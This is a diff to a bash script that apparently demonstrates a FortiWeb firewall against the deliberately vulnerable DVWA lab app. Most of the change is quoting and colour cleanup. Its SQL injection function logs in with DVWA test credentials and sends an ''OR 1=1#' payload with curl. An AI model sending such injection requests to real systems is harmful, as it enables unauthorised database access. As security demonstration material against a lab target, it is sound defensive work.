@@ -370,31 +370,34 @@ Command_Injection() {
 }
 
 SQL_Injection() {
-    echo -e "\nSQL Injection Attack\n"
-    echo -e "Connecting to ${BLUE}${DVWA_URL}/login.php${RESTORE} username=${BLUE}gordonb${RESTORE} password=${BLUE}abc123${RESTORE}\n"
-    curl '${DVWA_URL}/login.php' \
-        -H 'authority: dvwa.corp.fabriclab.ca' \
-        -H 'cache-control: max-age=0' \
-        -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: ${DVWA_URL}' \
-        -H 'referer: ${DVWA_URL}/' \
-        -H 'user-agent: FortiWeb Demo Script' \
+    echo ""
+    echo -e "SQL Injection Attack"
+    echo ""
+    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${YELLOW_BOLD}gordonb${RESTORE} password=${YELLOW_BOLD}abc123${RESTORE}\n"
+    curl "${DVWA_URL}/login.php" \
+        -H "authority: dvwa.corp.fabriclab.ca" \
+        -H "cache-control: max-age=0" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "origin: ${DVWA_URL}" \
+        -H "referer: ${DVWA_URL}/" \
+        -H "user-agent: FortiWeb Demo Script" \
         --insecure \
-        --data-raw 'username=gordonb&password=abc123&Login=Login' \
+        --data-raw "username=gordonb&password=abc123&Login=Login" \
         -c cookie.txt
 
-    echo -e "Connecting to ${BLUE}${DVWA_URL}/vulnerabilities/sqli/${RESTORE} id=${RED}\"'OR 1=1#\"\n"
-    curl -s '${DVWA_URL}/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit' \
-        -H 'authority: dvwa.corp.fabriclab.ca' \
-        -H 'cache-control: max-age=0' \
-        -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: ${DVWA_URL}' \
-        -H 'referer: ${DVWA_URL}/index.php' \
-        -H 'user-agent: FortiWeb Demo Script' \
+    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/sqli/${RESTORE} id=${RED}\"'OR 1=1#\"\n"
+    curl -s "${DVWA_URL}/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit" \
+        -H "authority: dvwa.corp.fabriclab.ca" \
+        -H "cache-control: max-age=0" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "origin: ${DVWA_URL}" \
+        -H "referer: ${DVWA_URL}/index.php" \
+        -H "user-agent: FortiWeb Demo Script" \
         --insecure \
         -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'
 
-    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
+    echo ""
+    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
     return 1
 }
